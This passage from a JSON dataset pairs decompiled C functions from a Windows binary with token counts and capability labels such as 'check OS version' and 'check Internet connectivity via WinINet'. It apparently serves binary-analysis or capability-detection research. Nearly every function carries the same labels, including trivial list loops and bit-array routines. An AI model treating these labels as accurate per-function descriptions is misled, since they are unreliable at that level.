        "decompiled_code": "\nvoid fcn.00418884(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    iVar2 = *(*(in_EAX + 0xc) + 8) + -1;\n    if (-1 < iVar2) {\n        do {\n            fcn.00419898();\n            cVar1 = fcn.00418864();\n            if (cVar1 != '\\0') {\n                fcn.0041978c();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    if ((*(in_EAX + 4) != 0) && (iVar2 = *(*(in_EAX + 4) + 8) + -1,  -1 < iVar2)) {\n        do {\n            fcn.00419898();\n            cVar1 = fcn.00418864();\n            if (cVar1 != '\\0') {\n                fcn.0041978c();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    if (*(in_EAX + 8) != NULL) {\n        iVar2 = (**(**(in_EAX + 8) + 0x14))();\n        iVar2 = iVar2 + -1;\n        if (-1 < iVar2) {\n            do {\n                (**(**(in_EAX + 8) + 0x18))();\n                cVar1 = fcn.00418864();\n                if (cVar1 != '\\0') {\n                    (**(**(in_EAX + 8) + 0x48))();\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != -1);\n        }\n    }\n    return;\n}\n",
        "token_count": 389
    },
    "00418a94": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00418a94(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    iVar2 = *(*(in_EAX + 4) + 8);\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar1 = fcn.00419898();\n            if (*(iVar1 + 0x10) != '\\0') {\n                iVar3 = fcn.004186d4();\n            }\n        } while ((iVar3 == 0) && (iVar2 = iVar2 + -1,  iVar2 != 0));\n    }\n    return CONCAT44(param_2, iVar3);\n}\n",
        "token_count": 174
    },
    "00418b68": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00418b68(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = fcn.00418a50();\n    if (iVar2 == 0) {\n        fcn.00418ad8(&stack0xfffffffc);\n    }\n    fcn.0041855c();\n    var_18h = *(*(in_EAX + 4) + 8);\n    if (-1 < var_18h + -1) {\n        do {\n            iVar3 = fcn.00419898();\n            if (((iVar3 != iVar2) && (*(iVar3 + 4) != 0)) && (iVar3 = *(*(iVar3 + 4) + 8) + -1,  -1 < iVar3)) {\n                do {\n                    fcn.00419898();\n                    cVar1 = fcn.0040487c();\n                    if ((cVar1 != '\\0') && (iVar4 = fcn.00418a50(),  iVar4 == iVar2)) {\n                        fcn.0041978c();\n                        fcn.00419740();\n                    }\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != -1);\n            }\n            var_18h = var_18h + -1;\n        } while (var_18h != 0);\n    }\n    return;\n}\n",
        "token_count": 362
    },
    "00418cf8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00418cf8(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = *(*(in_EAX + 4) + 8) + -1;\n    if (-1 < iVar2) {\n        do {\n            iVar1 = fcn.00419898();\n            fcn.00418884();\n            if (*(*(iVar1 + 0xc) + 8) == 0) {\n                fcn.00404650();\n                fcn.0041978c();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    return;\n}\n",
        "token_count": 152
    },
    "00418d48": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00418d48(uint arg_8h)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    char in_DL;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_ch;\n    uint var_5h;\n    \n    if (in_DL != '\\0') {\n        puStack48 = 0x418d5d;\n        in_EAX = fcn.00404974();\n    }\n    puStack48 = 0x418d70;\n    fcn.00404620();\n    puStack48 = 0x418d7c;\n    uVar3 = fcn.00404620();\n    *(in_EAX + 4) = uVar3;\n    puStack48 = 0x418d8c;\n    fcn.00418c34();\n    uStack52 = 0x418e47;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    iVar5 = *(*(*0x4999c4 + 4) + 8);\n    puStack48 = &stack0xfffffffc;\n    puVar1 = &stack0xfffffffc;\n    if (-1 < iVar5 + -1) {\n        do {\n            puStack48 = puVar1;\n            fcn.00419898();\n            cVar2 = fcn.0041873c();\n            if (cVar2 != '\\0') {\n                fcn.00419740();\n            }\n            iVar5 = iVar5 + -1;\n            puVar1 = puStack48;\n        } while (iVar5 != 0);\n    }\n    if ((arg_8h != '\\0') && (iVar5 = *(*(*0x4999c4 + 4) + 8),  -1 < iVar5 + -1)) {\n        do {\n            iVar4 = fcn.00419898();\n            if (*(iVar4 + 0x10) != '\\0') {\n                fcn.00419740();\n            }\n            iVar5 = iVar5 + -1;\n        } while (iVar5 != 0);\n    }\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x418e4e;\n    uStack52 = 0x418e46;\n    fcn.00418cec();\n    return;\n}\n",
        "token_count": 547
    },
    "00418ea4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00418ea4(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x418ec1;\n    fcn.00418c34();\n    uStack32 = 0x418f1b;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    iVar2 = *(*(in_EAX + 4) + 8);\n    puStack28 = &stack0xfffffffc;\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.00419898();\n            iVar1 = fcn.004186d4();\n            if (iVar1 != 0) {\n                fcn.00404f70();\n                return iVar1;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x418f22;\n    uStack32 = 0x418f1a;\n    iVar2 = fcn.00418cec();\n    return iVar2;\n}\n",
        "token_count": 296
    },
    "0041928c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0041928c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x4192a4;\n    iVar1 = fcn.00419c08();\n    uStack28 = 0x4192f6;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    iVar1 = *(iVar1 + 8) + -1;\n    puStack24 = &stack0xfffffffc;\n    if (-1 < iVar1) {\n        do {\n            iVar2 = fcn.00419898();\n            if (in_EAX == *(iVar2 + 4)) {\n                uVar3 = *(iVar2 + 8);\n                fcn.00404f70();\n                return uVar3;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != -1);\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x4192fd;\n    uStack28 = 0x4192f5;\n    uVar3 = fcn.00419c6c();\n    return uVar3;\n}\n",
        "token_count": 306
    },
    "0041938c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041938c(void)\n\n{\n    int32_t iVar1;\n    \n    if (*0x4999c8 == 0) {\n        *0x4999c8 = fcn.00404620();\n    }\n    iVar1 = fcn.004198f4();\n    if (iVar1 < 0) {\n        fcn.00419740();\n    }\n    return;\n}\n",
        "token_count": 88
    },
    "004193cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004193cc(void)\n\n{\n    if (*0x4999c8 != 0) {\n        fcn.004199dc();\n    }\n    return;\n}\n",
        "token_count": 39
    },
    "004193e4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.004193e4(void)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    \n    iVar1 = 0;\n    if ((*0x4999c8 != 0) && (iVar3 = *(*0x4999c8 + 8) + -1,  -1 < iVar3)) {\n        do {\n            pcVar2 = fcn.00419898();\n            iVar1 = (*pcVar2)();\n            if (iVar1 != 0) {\n                return iVar1;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != -1);\n    }\n    return iVar1;\n}\n",
        "token_count": 153
    },
    "00419424": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00419424(void)\n\n{\n    uint32_t uVar1;\n    \n    if (*0x4999b4 != NULL) {\n        uVar1 = (**0x4999b4)();\n        return uVar1;\n    }\n    uVar1 = fcn.004193e4();\n    return uVar1 & 0xffffff00 | uVar1 == 0;\n}\n",
        "token_count": 88
    },
    "00419554": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00419554(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    fcn.00407688();\n    fcn.00404650();\n    iVar1 = fcn.00407688();\n    iVar1 = *(iVar1 + 0xc);\n    uVar2 = fcn.00419980();\n    iVar3 = fcn.00407688();\n    *(iVar3 + 8) = uVar2;\n    fcn.0041978c();\n    if (*(iVar1 + 8) == 0) {\n        iVar1 = fcn.00407688();\n        *(iVar1 + 0xc) = 0;\n        fcn.00404650();\n    }\n    return;\n}\n",
        "token_count": 168
    },
    "00419658": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00419658(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uchar *arg_8h;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    char var_ah;\n    uchar var_9h;\n    uint var_8h;\n    int32_t var_4h;\n    \n    arg_8h = &stack0xfffffffc;\n    puStack20 = 0x41966e;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    (**(**0x4999b0 + 0x14))();\n    uStack24 = 0x419706;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    var_ah = *0x41971c == (*(var_4h + 0x1c) & *0x419718);\n    puStack20 = &stack0xfffffffc;\n    if (var_ah) {\n        puStack32 = 0x4196a3;\n        puStack20 = &stack0xfffffffc;\n        fcn.004194cc();\n    }\n    uStack36 = 0x4196e7;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    fcn.00404528();\n    var_9h = fcn.004195b0(arg_8h);\n    if (var_ah != '\\0') {\n        fcn.00419524();\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x4196ee;\n    if (var_ah != '\\0') {\n        uStack36 = 0x4196e6;\n        fcn.00419554();\n    }\n    return;\n}\n",
        "token_count": 444
    },
    "00419ccc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00419ccc(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    if (param_2 != *(in_EAX + 4)) {\n        if (param_2 < 0) {\n            fcn.00419ca8(param_1);\n        }\n        iVar1 = param_2 + 0x1f;\n        if (iVar1 < 0) {\n            iVar1 = param_2 + 0x3e;\n        }\n        iVar1 = (iVar1 >> 5) * 4;\n        iVar2 = *(in_EAX + 4) + 0x1f;\n        if (iVar2 < 0) {\n            iVar2 = *(in_EAX + 4) + 0x3e;\n        }\n        iVar2 = (iVar2 >> 5) * 4;\n        if (iVar2 != iVar1) {\n            iVar3 = 0;\n            if (iVar1 != 0) {\n                iVar3 = fcn.00402f00();\n                fcn.00403af4();\n            }\n            if (iVar2 != 0) {\n                if (iVar3 != 0) {\n                    fcn.00419cc0();\n                    fcn.004030fc();\n                }\n                fcn.00402f1c();\n            }\n            *(in_EAX + 8) = iVar3;\n        }\n        *(in_EAX + 4) = param_2;\n    }\n    return;\n}\n",
        "token_count": 350
    },
    "00419d70": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00419d70(char param_1, uint32_t param_2)\n\n{\n    uint8_t *puVar1;\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 4) <= param_2) {\n        if (param_2 < 0) {\n            fcn.0040dbb8();\n            fcn.00404ec4();\n            return;\n        }\n        fcn.00419ccc();\n    }\n    if (param_1 != '\\0') {\n        puVar1 = *(in_EAX + 8) + (param_2 >> 3);\n        *puVar1 = *puVar1 | '\\x01' << (param_2 & 7);\n        return;\n    }\n    puVar1 = *(in_EAX + 8) + (param_2 >> 3);\n    *puVar1 = *puVar1 & ~('\\x01' << (param_2 & 7));\n    return;\n}\n",
        "token_count": 216
    },
    "00419f30": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00419f99)\n\nvoid fcn.00419f30(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_fffffed4;\n    uint uStack288;\n    uint uStack284;\n    uchar *puStack280;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack280 = &stack0xfffffffc;\n    uStack284 = 0x419fc5;\n    uStack288 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack288;\n    fcn.00404530();\n    fcn.00405794();\n    iVar1 = fcn.0040484c();\n    if (iVar1 != 0) {\n        fcn.0040484c();\n        fcn.0040484c();\n    }\n    *in_FS_OFFSET = in_stack_fffffed4;\n    fcn.00405530(0x419fcc);\n    return;\n}\n",
        "token_count": 217
    },
    "0041a0bc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041a0bc(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    if (0 < *(in_EAX[2] + 8)) {\n        puStack16 = 0x41a0d8;\n        (**(*in_EAX + 0x20))();\n        uStack20 = 0x41a116;\n        uStack24 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe8;\n        puStack16 = &stack0xfffffffc;\n        while (0 < *(in_EAX[2] + 8)) {\n            fcn.00419980();\n            fcn.00404650();\n        }\n        *in_FS_OFFSET = uStack24;\n        puStack16 = 0x41a11d;\n        uStack20 = 0x41a115;\n        (**(*in_EAX + 0x24))();\n        return;\n    }\n    return;\n}\n",
        "token_count": 238
    },
    "0041a30c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041a30c(void)\n\n{\n    int32_t *in_EAX;\n    \n    if (in_EAX[4] == 0) {\n        (**(*in_EAX + 0x30))();\n    }\n    in_EAX[4] = in_EAX[4] + 1;\n    return;\n}\n",
        "token_count": 74
    },
    "0041a3c8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041a3c8(void)\n\n{\n    int32_t *in_EAX;\n    \n    in_EAX[4] = in_EAX[4] + -1;\n    if (in_EAX[4] == 0) {\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 75
    },
    "0041acb0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041acb0(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x14) != 0) {\n        (**(**(in_EAX + 0x14) + 0x10))();\n    }\n    fcn.00407024();\n    if (*(in_EAX + 0x14) != 0) {\n        (**(**(in_EAX + 0x14) + 0xc))();\n    }\n    return;\n}\n",
        "token_count": 110
    },
    "0041b3d4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041b3d4(uint arg_8h)\n\n{\n    int32_t *in_EAX;\n    int32_t in_EDX;\n    \n    if (*(in_EAX + 9) != '\\0') {\n        fcn.0041a4c0();\n    }\n    if ((in_EDX < 0) || (in_EAX[7] < in_EDX)) {\n        fcn.0041a4c0();\n    }\n    (**(*in_EAX + 0x88))(arg_8h);\n    return;\n}\n",
        "token_count": 124
    },
    "0041b7ac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041b7ac(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *in_EAX;\n    int32_t *extraout_ECX;\n    \n    if (arg_ch == -1) {\n        if (0x7fffffff < arg_8h) {\ncode_r0x0041b7c4:\n            if (arg_ch == 0) {\n                if (arg_8h < 0x80000000) goto code_r0x0041b7ee;\n            }\n            else if (arg_ch < 1) goto code_r0x0041b7ee;\n        }\n    }\n    else if (-2 < arg_ch) goto code_r0x0041b7c4;\n    fcn.0040dbb8();\n    fcn.00404ec4();\n    in_EAX = extraout_ECX;\ncode_r0x0041b7ee:\n    (**(*in_EAX + 4))();\n    return;\n}\n",
        "token_count": 220
    },
    "0041b84c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041b84c(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t var_20h;\n    int32_t var_1ah;\n    uint *var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t *var_4h;\n    \n    var_14h = &var_20h;\n    var_10h = *(*in_EAX + 0x18);\n    var_4h = in_EAX;\n    var_20h = fcn.00404528();\n    while ((var_20h != 0 && (var_20h != *0x41794c))) {\n        var_20h = fcn.004045dc();\n    }\n    if (var_20h == 0) {\n        fcn.0041b800(&stack0xfffffffc);\n    }\n    unique0x00007a00 = *(var_20h + 0x18);\n    if (var_10h == unique0x00007a00) {\n        fcn.0041b800(&stack0xfffffffc);\n    }\n    (**(*var_4h + 0x18))(param_2, param_2 >> 0x1f);\n    return;\n}\n",
        "token_count": 288
    },
    "0041b8d0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t __cdecl fcn.0041b8d0(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_ch == -1) {\n        if (0x7fffffff < arg_8h) {\ncode_r0x0041b8ef:\n            if (arg_ch == 0) {\n                if (arg_8h < 0x80000000) goto code_r0x0041b919;\n            }\n            else if (arg_ch < 1) goto code_r0x0041b919;\n        }\n    }\n    else if (-2 < arg_ch) goto code_r0x0041b8ef;\n    fcn.0040dbb8();\n    fcn.00404ec4();\ncode_r0x0041b919:\n    iVar1 = (**(*in_EAX + 0x14))();\n    return iVar1;\n}\n",
        "token_count": 226
    },
    "0041b9b0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041b9b0(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    uint *in_EDX;\n    uint32_t uVar1;\n    uint *in_FS_OFFSET;\n    int64_t iVar2;\n    uint uStackY52;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    iVar2 = CONCAT44(arg_ch, arg_8h);\n    if ((arg_ch == 0) && (iVar2 = CONCAT44(arg_ch, arg_8h),  arg_8h == 0)) {\n        uStackY52 = 0x41b9d5;\n        fcn.0041b734(0, 0);\n        uStackY52 = 0x41b9db;\n        iVar2 = (***in_EDX)();\n    }\n    arg_ch = iVar2 >> 0x20;\n    arg_8h = iVar2;\n    if (arg_ch == 0) {\n        if (arg_8h < 0xf001) {\ncode_r0x0041ba09:\n            var_14h = arg_8h;\n            goto code_r0x0041ba0f;\n        }\n    }\n    else if (iVar2 < 0x100000000) goto code_r0x0041ba09;\n    var_14h = 0xf000;\ncode_r0x0041ba0f:\n    fcn.00402f00();\n    uStackY52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    do {\n        arg_ch = iVar2 >> 0x20;\n        arg_8h = iVar2;\n        if (iVar2 == 0) {\n            *in_FS_OFFSET = uStackY52;\n            fcn.00402f1c();\n            return;\n        }\n        uVar1 = var_14h;\n        if (var_14h >> 0x1f == arg_ch) {\n            if (arg_8h <= var_14h) {\ncode_r0x0041ba41:\n                uVar1 = arg_8h;\n            }\n        }\n        else if (arg_ch <= var_14h >> 0x1f) goto code_r0x0041ba41;\n        fcn.0041b940();\n        fcn.0041b978();\n        iVar2 = iVar2 - uVar1;\n    } while( true );\n}\n",
        "token_count": 550
    },
    "0041bc0c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041bc0c(uint noname_0, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffa8;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    if (in_DL != '\\0') {\n        puStack72 = 0x41bc2f;\n        in_EAX = fcn.00404974();\n        in_DL = extraout_DL;\n    }\n    uStack76 = 0x41bd54;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    var_1h._0_1_ = in_DL;\n    if (arg_ch == -1) {\n        in_stack_ffffffa8 = 0x80;\n        puStack72 = &fcn.0041bc0c::var_1h + 1;\n        uVar1 = fcn.004059dc(0xc0000000, 0, 0, 2, 0x80, 0);\n        sub.kernel32.dll_CreateFileA_1(uVar1);\n        fcn.0041bb04();\n        if (*(in_EAX + 4) < 0) {\n            fcn.0040a70c();\n            var_14h = 0;\n            var_10h._0_1_ = 0xb;\n            sub.kernel32.dll_GetLastError_1();\n            fcn.0040d2e8();\n            var_ch = 0;\n            var_8h._0_1_ = 0xb;\n            fcn.0040dbf4(1, &fcn.0041bc0c::var_14h);\n            fcn.00404ec4();\n        }\n    }\n    else {\n        puStack72 = &fcn.0041bc0c::var_1h + 1;\n        fcn.0040a16c();\n        fcn.0041bb04();\n        if (*(in_EAX + 4) < 0) {\n            fcn.0040a70c();\n            var_14h = 0;\n            var_10h._0_1_ = 0xb;\n            sub.kernel32.dll_GetLastError_1();\n            fcn.0040d2e8();\n            var_ch = 0;\n            var_8h._0_1_ = 0xb;\n            in_stack_ffffffa8 = 1;\n            fcn.0040dbf4(1, &fcn.0041bc0c::var_14h);\n            fcn.00404ec4();\n        }\n    }\n    fcn.00405584();\n    *in_FS_OFFSET = in_stack_ffffffa8;\n    uStack80 = 0x41bd5b;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 731
    },
    "0041c234": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
